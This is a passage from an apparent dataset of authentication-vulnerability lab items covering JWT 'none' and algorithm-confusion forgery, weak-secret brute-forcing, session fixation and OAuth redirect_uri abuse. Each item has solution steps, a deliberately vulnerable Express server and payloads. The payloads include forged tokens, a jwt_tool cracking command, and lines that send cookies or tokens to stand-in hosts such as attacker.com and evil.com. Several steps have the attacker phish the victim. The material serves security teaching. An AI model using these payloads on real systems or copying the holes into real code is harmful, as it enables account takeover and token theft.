    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.post('/login', (req, res) => { const sessionId = 'sess_' + Math.random().toString(36).substring(2); sessions[sessionId] = { user: 'carlos' }; res.cookie('session', sessionId); res.send('Logged in'); }); app.post('/logout', (req, res) => { res.send('Logged out'); }); app.get('/account/profile', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]) { res.send(`User profile for ${sessions[sessionId].user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4500);",
    "payloads": [
      "Cookie: session=sess_example_hijack_value",
      "/account/profile endpoint access with the reused cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification logic",
    "Lab Description": "The application uses a JWT library that allows switching between asymmetric (RS256) and symmetric (HS256) algorithms without proper validation, enabling attackers to forge tokens with HS256 using the public key as the secret. To solve: download the public key, sign a malicious admin token using HS256, and access /admin/dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to observe the JWT token in the Authorization header during login and note the alg parameter set to RS256.",
      "Download the server's exposed public key from /public.pem.",
      "Craft a new JWT with {\"user\":\"carlos\",\"role\":\"admin\"} and change the alg field to HS256.",
      "Sign the new token using the public key as the secret and inject it into the Authorization header.",
      "Send the request to /admin/dashboard and verify administrative access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('public.pem'); app.use(require('body-parser').json()); app.get('/admin/dashboard', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') res.send('Welcome Admin Carlos!'); else res.status(403).send('Access denied'); } catch (err) { res.status(500).send(err.message); } }); app.listen(4600);",
    "payloads": [
      "JWT Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "JWT Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Secret Key: public.pem contents used as HMAC secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to authorization code reuse",
    "Lab Description": "The application uses OAuth 2.0 Authorization Code flow but does not invalidate the authorization code after the first use, allowing reuse for session hijacking. The application [accepts stale codes]. To solve: intercept the authorization code, reuse it for a second login attempt to access /user/dashboard as Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the OAuth authorization process and capture the authorization code parameter from the redirect.",
      "Allow the victim to use the code once and confirm the login succeeds.",
      "Reuse the same authorization code in a second crafted POST /oauth/token request.",
      "Exchange the code for a valid access token, despite it being reused.",
      "Use the token to access /user/dashboard and confirm the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode1234'; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode1234') { res.json({ access_token: 'reusable-token' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer reusable-token') { res.send('Carlos's Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4700);",
    "payloads": [
      "Authorization Code: authcode1234",
      "Access Token: Bearer reusable-token",
      "Endpoint: /user/dashboard"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack in Cookie Assignment",
    "Lab Description": "The application is vulnerable to session fixation because it accepts and trusts user-provided session IDs without regenerating them upon login. The application assigns the session ID based on the `session` cookie and never invalidates it post-authentication. To solve: set a known session ID, perform a login as yourself, and then reuse the fixed session ID to hijack Carlos's session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login page request and manually inject a crafted `session` cookie like `session=attacker-session`.",
      "Submit valid login credentials with the crafted session ID still set and observe that the server accepts it unchanged.",
      "Log out and attempt to reuse the same `session` value `attacker-session` in a new request to /my-account.",
      "Send a credential stuffing attack using the same `session` cookie for Carlos's credentials.",
      "Verify that the server authenticates the session and grants access to Carlos's /my-account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'supersecret' }; const sessions = {}; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username) { res.send(`Welcome ${username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4100);",
    "payloads": [
      "Cookie: session=attacker-session",
      "POST body: username=carlos&password=supersecret",
      "GET /my-account with Cookie: session=attacker-session"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm attack in Token Validation",
    "Lab Description": "The application's JWT implementation does not properly enforce the algorithm check and accepts tokens signed with the `none` algorithm, bypassing signature verification. The application uses this token to control user access levels. To solve: modify the token to use `alg=none` and set `admin=true` to gain administrative privileges.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a legitimate JWT token using Burp Suite from the Authorization header after logging in.",
      "Decode the JWT using jwt.io and modify the header to `{ \"alg\": \"none\" }`.",
      "Edit the payload to `{ \"username\": \"carlos\", \"admin\": true }`.",
      "Remove the signature and send the token in an Authorization header as a Bearer token.",
      "Access /admin-panel and confirm you have administrative privileges, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'super-secret', { algorithms: ['HS256', 'none'] }); if (decoded.admin) res.send('Admin Access Granted'); else res.status(403).send('Access Denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4200);",
    "payloads": [
      "JWT Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "JWT Payload: {\"username\":\"carlos\",\"admin\":true}",
      "Final JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "OAuth Token Misuse in Redirect URI Trust",
    "Lab Description": "The OAuth server in this lab improperly trusts wildcards in redirect URIs, allowing attackers to exfiltrate authorization codes to an external malicious domain. The application [uses a poorly validated wildcard match]. To solve: exploit the redirect URI to leak Carlos's code and reuse it to obtain his access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login and note the redirect_uri parameter allows wildcards like `https://yourdomain.com/*`.",
      "Craft a malicious URL replacing the subpath with your controlled server `https://yourdomain.com.attacker.com/callback`.",
      "Send the link to Carlos (assume social engineering or XSS) and wait for him to authorize the app.",
      "Capture the leaked code in your server logs and exchange it for an access token at `/oauth/token`.",
      "Use the token to call `/user/dashboard` as Carlos and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validCodes = {}; app.get('/oauth/authorize', (req, res) => { const code = 'authcode-carlos'; validCodes[code] = req.query.redirect_uri; res.redirect(`${req.query.redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (validCodes[code]) { res.json({ access_token: 'token-for-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/user/dashboard', (req, res) => { if (req.headers.authorization === 'Bearer token-for-carlos') { res.send('Carlos Dashboard Loaded'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4300);",
    "payloads": [
      "Malicious Redirect URI: https://yourdomain.com.attacker.com/callback",
      "Intercepted Auth Code: authcode-carlos",
      "Access Token: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirect flow",
    "Lab Description": "The login flow does not regenerate session tokens upon authentication, allowing an attacker to fixate a session ID for a victim. The application fails to invalidate existing session tokens during login. To solve: hijack Carlos's session after login using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and inspect the Set-Cookie header for session ID",
      "Inject the fixed session ID into the victim's browser via phishing or stored XSS in a comment section",
      "Wait for Carlos to log in using the pre-set session ID",
      "Access the account page using the same session ID to confirm session hijacking",
      "Verify by visiting /my-account with the stolen session cookie"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': { password: 'hunter2' } }; app.get('/login', (req, res) => { const session = req.cookies.session || 'sess_' + Math.random().toString(36).substring(2); res.setHeader('Set-Cookie', `session=${session}; HttpOnly`); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\" /><br/>Password: <input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; if (sess && sess.startsWith('sess_')) { res.send('Account page for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "sess_presetcookievalue12345",
      "<img src='http://attacker.com?cookie=sess_presetcookievalue12345'>",
      "document.cookie='session=sess_presetcookievalue12345';"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm",
    "Lab Description": "The application improperly accepts unsigned JWTs by trusting the 'none' algorithm when parsing tokens. This leads to privilege escalation. To solve: forge a JWT as 'admin' and access the admin panel without a valid signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite from a POST /login request",
      "Decode the JWT and inspect its header and payload at jwt.io",
      "Replace alg to 'none' and set payload to {\"username\":\"admin\"}",
      "Strip the signature completely and send the tampered token in Authorization: Bearer header",
      "Access /admin/dashboard to confirm unauthorized access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: { password: 'adminpass' }, user: { password: 'userpass' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin/dashboard', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'admin') res.send('Welcome to admin panel'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT Error'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth implementation lacks proper redirect URI validation. Attackers can inject malicious redirect URIs to steal tokens. The application accepts arbitrary URLs in the `redirect_uri` parameter during login. To solve: trick the server into redirecting the victim's token to your domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and capture the initial OAuth request containing the redirect_uri parameter",
      "Replace the redirect_uri with your attacker-controlled domain (e.g. https://evil.com/token-stealer)",
      "Send the crafted URL to the victim via social engineering",
      "Wait for the victim to authorize and capture the access_token sent to your domain",
      "Replay the token using Postman in Authorization header to access protected resource"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id !== 'trusted-app') return res.status(400).send('Invalid client'); const url = `${redirect_uri}?access_token=${tokens['carlos']}`; res.redirect(url); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === 'abc123token') res.send('Carlos profile'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect URI Lab running on port 5000'));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=trusted-app&redirect_uri=https://evil.com/token-stealer&response_type=token",
      "https://evil.com/token-stealer?access_token=abc123token",
      "Authorization: Bearer abc123token"
    ]
  },
  {
    "Lab scenario": "JWT secret key brute-force in REST API login",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. The secret key used to sign the JWTs is weak and guessable. Tokens are validated purely on signature without proper expiration or audience claims. To solve: forge a valid JWT for the user 'carlos' using a brute-forced secret and access his account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a login request using Burp Suite and extract the JWT from the response.",
      "Use jwt_tool.py or Postman to decode and analyze the JWT header and payload.",
      "Run a brute-force attack with jwt-cracker or hashcat using a wordlist to identify the correct secret key.",
      "Recreate a token with the username changed to 'carlos', and sign it using the cracked secret.",
      "Send a GET /api/account request with the forged JWT in the Authorization header to verify successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'admin123', 'carlos': 'carlos789' }; const SECRET_KEY = 'admin'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, SECRET_KEY); return res.json({ token }); } res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.username === 'carlos') return res.send('Account details for carlos'); return res.status(403).send('Unauthorized'); } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Brute-force Lab running on port 3000'));",
    "payloads": [
      "jwt_tool.py -t <token> -d -C -S -p -k /usr/share/wordlists/rockyou.txt",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.<valid_signature>",
      "jwt.io > manually modified payload with username 'carlos', signed with secret 'admin'"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure redirect",
    "Lab Description": "The login system fails to regenerate session tokens after authentication. Attackers can predetermine session IDs and force the victim to authenticate using them. The application accepts session IDs from the URL and uses them directly. To solve: fixate a known session ID and get Carlos to log in, then reuse that session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to register a user and analyze session handling behavior via Set-Cookie headers.",
      "Create a crafted link with a predetermined session ID using GET /login?session=attackerSession123 and send to Carlos (assumed simulated action).",
      "Wait for Carlos to log in using that link, which binds his session to attackerSession123.",
      "Send a request to /dashboard with the cookie session=attackerSession123 to access Carlos's session.",
      "Validate session takeover by confirming personalized content or account information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { 'carlos': 'secure456' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sessId); res.send('Login page'); }); app.post('/auth', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; if (users[username] === password) { sessions[sessId] = username; return res.redirect('/dashboard'); } res.status(401).send('Invalid credentials'); }); app.get('/dashboard', (req, res) => { const sessId = req.cookies.session; if (sessions[sessId] === 'carlos') return res.send('Carlos's Dashboard'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "GET /login?session=attackerSession123",
      "Cookie: session=attackerSession123",
      "POST /auth { username: 'carlos', password: 'secure456' }",
      "GET /dashboard with Cookie: session=attackerSession123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leak via referer header",
    "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects tokens via the URL fragment. This fragment gets exposed through the HTTP Referer header when navigating to third-party resources. To solve: intercept the access token issued to Carlos and reuse it to access his account profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept an OAuth redirect request using Burp Suite, where the access_token is present in the URL fragment.",
      "Identify an embedded resource (e.g., image or iframe) in the post-login redirect that leaks the full URL including the token in the Referer header.",
      "Use a malicious external endpoint or inspect simulated logs to recover the leaked token.",
      "Send a GET /user/profile request with Authorization: Bearer <leaked_token> to gain access to Carlos's profile.",
      "Confirm access to protected resources without needing to reauthenticate."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos': 'token-carlos-abc' }; app.get('/oauth/callback', (req, res) => { res.send(`<html><body><img src='http://attacker.com/steal?ref=${req.headers.referer}' /><script>location.href='/profile#access_token=token-carlos-abc';</script></body></html>`); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-abc') return res.send('Carlos profile info'); res.status(403).send('Access Denied'); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
    "payloads": [
      "GET /oauth/callback → Referer logs leak access_token=token-carlos-abc",
      "Authorization: Bearer token-carlos-abc",
      "GET /profile with header: Authorization: Bearer token-carlos-abc"
    ]
  },
  {
    "Lab scenario": "JWT secret key brute-force in REST API Authorization Header",
    "Lab Description": "This lab involves a JWT-based authorization system where the backend uses a weak secret key to sign tokens. The application validates JWT tokens included in the `Authorization: Bearer` header for API access. However, it fails to implement strong key management. To solve: Forge a valid admin JWT using brute-force and access the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a valid request to /api/profile and copy the Authorization JWT token.",
      "2.Send the JWT to jwt.io to analyze its algorithm (HS256) and claims structure.",
      "3.Use `jwt-cracker` or `john` with rockyou.txt to brute-force the weak HMAC secret.",
      "4.Craft a new JWT token with header `{ alg: 'HS256' }` and payload `{ \"username\": \"admin\", \"role\": \"admin\" }` signed with the cracked secret.",
      "5.Use Postman to send a GET request to /api/admin-dashboard with the forged JWT in the Authorization header and verify successful access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'letmein'; app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); res.json({ message: `Hello ${user.username}` }); } catch { res.status(403).send('Invalid token'); } }); app.get('/api/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); if (user.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to admin dashboard'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Authorization: Bearer <JWT with payload { \"username\": \"admin\", \"role\": \"admin\" } signed with 'letmein'>",
      "JWT brute-forced secret: letmein"
    ]
  },
  {
    "Lab scenario": "Session fixation in login endpoint with reusable session ID",
    "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it post-login. This allows attackers to fixate a victim's session by pre-defining the session cookie and tricking them into logging in using it. To solve: Log into Carlos's account by fixing a session ID and reusing it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to send a GET request to /login and note the Set-Cookie: sessionId=xyz header.",
      "2.Copy this session ID and send a crafted phishing link to Carlos with the pre-set session ID cookie.",
      "3.After Carlos logs in using the attacker-defined session, reuse the same session ID in a GET /my-account request.",
      "4.In Burp, add Cookie: sessionId=xyz and send the request to /my-account to access Carlos’s session.",
      "5.Verify lab success by reading Carlos's personal data from the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(7); res.cookie('sessionId', sid); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionId; sessions[sid] = user.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /login → extract sessionId from Set-Cookie",
      "Send phishing link with fixed sessionId cookie to victim",
      "Reuse sessionId in Cookie header after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation leading to account takeover",
    "Lab Description": "The application uses OAuth for third-party login but improperly validates redirect URIs during the authentication handshake. An attacker can tamper with the redirect_uri parameter to receive the authorization code for another user. To solve: Steal Carlos’s OAuth code and use it to link his account to yours.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to intercept the initial /auth/google request and observe the redirect_uri parameter.",
      "2.Change the redirect_uri to a domain controlled by the attacker (e.g. attacker.com/oauth-callback) and host a listener.",
      "3.Send Carlos a phishing link with the modified redirect_uri and trick him into authenticating.",
      "4.Receive Carlos’s OAuth authorization code on your listener and exchange it for a valid access token via Google's token endpoint.",
      "5.Send a POST request to /oauth/callback with Carlos's token and gain access to his account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/auth/google', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=abc123&redirect_uri=${redirectUri}&scope=profile`; res.redirect(authUrl); }); app.post('/oauth/callback', async (req, res) => { const { code } = req.body; const response = await axios.post('https://oauth2.googleapis.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: req.headers.referer, grant_type: 'authorization_code' }); const accessToken = response.data.access_token; res.send(`Access token: ${accessToken}`); }); app.listen(4000);",
    "payloads": [
      "Modified redirect_uri=https://attacker.com/oauth-callback",
      "OAuth token request using stolen code",
      "POST /oauth/callback with code=<Carlos’s code>"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in Token Verification",
    "Lab Description": "The application verifies JWT tokens without enforcing strict validation of the algorithm used. The vulnerable component fails to check if the 'alg' parameter is set to 'none'. The application accepts this altered token as valid, allowing attackers to forge tokens and impersonate users. To solve: forge a valid JWT for the user 'carlos' using algorithm 'none' and access the /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp Suite to capture the JWT after logging in with your own account.",
      "Decode the JWT using jwt.io or a Python script to inspect the header and payload.",
      "Modify the header to set 'alg' to 'none' and change the payload to {\"username\":\"carlos\"}. Remove the signature.",
      "Re-encode the modified JWT and send it with a new Authorization: Bearer header in a request to /my-account.",
      "Verify access is granted to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); return res.send(`Welcome ${payload.username}`); } jwt.verify(token, 'secret'); const verifiedPayload = jwt.decode(token); res.send(`Welcome ${verifiedPayload.username}`); } catch { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT None Bypass running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "OAuth Token Leakage in Redirect URL Handler",
    "Lab Description": "The OAuth flow in this application mishandles access tokens by reflecting them in the URL. A malicious actor can harvest tokens via browser history or referer headers. The application redirects to a vulnerable page with tokens embedded. To solve: steal the access token issued to Carlos and use it to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization request.",
      "Notice the access token returned in the URL as a query string: /redirect?access_token=....",
      "Craft a malicious redirect_uri to exfiltrate this token using a web server you control (e.g., requestbin).",
      "Force the victim (Carlos) to authenticate via the crafted link and capture the token.",
      "Replay the request to /my-account using Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const accessTokens = { 'carlos-token': 'carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const user = accessTokens[token]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(3000, () => console.log('OAuth Token Leak running'));",
    "payloads": [
      "https://attacker.com/redirect?access_token=carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Session Initialization",
    "Lab Description": "The application allows users to supply their own session identifiers before authentication. Session tokens are not regenerated after login, enabling fixation. The attacker can fix a session ID and trick a victim into logging in with it. To solve: fix a session ID for Carlos, wait for login, then access /dashboard using the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a session by visiting / and setting a custom session ID like session=attacker123.",
      "Send the session link (with the pre-set session ID) to the victim via phishing (e.g., /login with ?session=attacker123).",
      "Wait until the victim logs in using the fixed session.",
      "Use the same session ID to access the /dashboard endpoint.",
      "Validate that the response shows Carlos's data, confirming successful session fixation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 's3cret' }; app.use((req, res, next) => { let sid = req.cookies.session || req.query.session || `sess-${Math.random()}`; res.cookie('session', sid); if (!sessions[sid]) sessions[sid] = {}; req.session = sessions[sid]; next(); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) res.send(`Dashboard for ${req.session.user}`); else res.status(403).send('Not authenticated'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "/?session=attacker123",
      "POST /login with session=attacker123, username=carlos, password=s3cret",
      "GET /dashboard with cookie session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT signature none bypass in authentication header",
    "Lab Description": "The authentication system uses JWTs but fails to validate tokens with the 'none' algorithm. The application uses the JWT in the Authorization header for access control but does not enforce proper algorithm checks during signature verification. To solve: craft a forged JWT with algorithm set to 'none' and access Carlos's account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite Proxy after logging into your own account.",
      "Send the request to Burp Repeater and observe the JWT format: header.payload.signature.",
      "Modify the JWT header to {\"alg\":\"none\"} and remove the signature section entirely.",
      "In the JWT payload, change the username from your own to 'carlos'. Re-encode the token using Base64 without padding.",
      "Replace the Authorization header with the tampered token and resend the request to the protected /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation in login flow",
    "Lab Description": "The application uses a third-party OAuth provider for login and redirects users based on the 'redirect_uri' parameter. The redirect URI is insufficiently validated, allowing attackers to steal authorization codes. To solve: intercept and modify the OAuth flow to capture Carlos's code and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start the login process and observe the OAuth redirection request in Burp Suite with a redirect_uri parameter.",
      "Send the request to Repeater and change redirect_uri to your own attacker-controlled domain that captures query parameters.",
      "Send the modified link to Carlos through any injection point (e.g., comment box or support message) if social engineering is enabled.",
      "Wait for Carlos to click the malicious link and capture the code from your HTTP server.",
      "Exchange the stolen code manually using Postman to retrieve Carlos's access_token and use it to call the /account endpoint."
    ],
    "Vulnerability name": "Authentication",
